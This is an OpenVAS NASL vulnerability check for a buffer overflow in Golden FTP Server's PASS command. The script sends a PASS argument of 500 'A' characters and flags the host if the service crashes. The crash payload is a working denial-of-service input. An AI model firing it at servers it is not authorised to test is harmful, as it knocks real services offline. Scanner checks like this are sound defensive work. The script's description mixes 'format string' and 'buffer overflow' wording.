###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_goldenftp_pass_cmd_bof_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# Golden FTP PASS Command Buffer Overflow Vulnerability
#
# Authors:
# Veerendra G.G <veernedragg@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to to execute arbitrary
  code on the system or cause the application to crash.
  Impact Level: Application";
tag_affected = "Golden FTP Server Version 4.70, other versions may also be affected.";
tag_insight = "The flaw is due to format string error while parsing 'PASS' command,
  which can be exploited to crash the FTP service by sending 'PASS' command
  with an overly long username parameter.";
tag_solution = "No solution or patch is available as of 7th June, 2011. Information
  regarding this issue will updated once the solution details are available.
  For updates refer to http://www.goldenftpserver.com/";
tag_summary = "The host is running Golden FTP Server and is prone to buffer overflow
  vulnerability.";

if(description)
{
  script_id(802024);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-06-13 15:28:04 +0200 (Mon, 13 Jun 2011)");
  script_cve_id("CVE-2006-6576");
  script_bugtraq_id(45957, 45924);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("Golden FTP PASS Command Buffer Overflow Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://osvdb.org/35951");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/23323");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17355");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/16036");
  script_description(desc);
  script_summary("Determine if Golden FTP Server is prone to buffer overflow vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("FTP");
  script_require_ports("Services/ftp", 21);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

##
## The script code starts here
##

include("ftp_func.inc");

## Get the default FTP port
ftpPort = get_kb_item("Services/ftp");
if(!ftpPort){
  ftpPort = 21;
}

## Check FTP Port Status
if(!get_port_state(ftpPort)){
  exit(0);
}

## Confirm the application with FTP banner
banner = get_ftp_banner(port:ftpPort);
if("Golden FTP Server" >!< banner){
  exit(0);
}

## Open TCP Socket
soc = open_sock_tcp(ftpPort);
if(!soc) {
  exit(0);
}

## Accept the banner
resp =  recv_line(socket:soc, length:100);
if("220 Golden FTP Server" >!< resp){
  exit(0);
}

## Send User Command with Anonymous parameter
user_cmd = string("USER Anonymous", "\r\n");
send(socket:soc, data:user_cmd);
resp = recv_line(socket:soc, length:260);

## Send PASS command with crafted data
pass_cmd = string("PASS " , crap(data:'A', length:500) , "\r\n");
send(socket:soc, data:pass_cmd);
resp = recv_line(socket:soc, length:260);

## Close FTP socket
ftp_close(socket:soc);

## Sleep for 1 sec
sleep(1);

## Open TCP Socket to check Server is dead or alive
soc1 = open_sock_tcp(ftpPort);
if(!soc1) {
  security_hole(port:ftpPort);
  exit(0);
}

## Confirm FTP Server is still alive but responding
resp =  recv_line(socket:soc1, length:100);
if("220 Golden FTP Server" >!< resp){
  security_hole(port:ftpPort);
}

## Close FTP socket
ftp_close(socket:soc1);
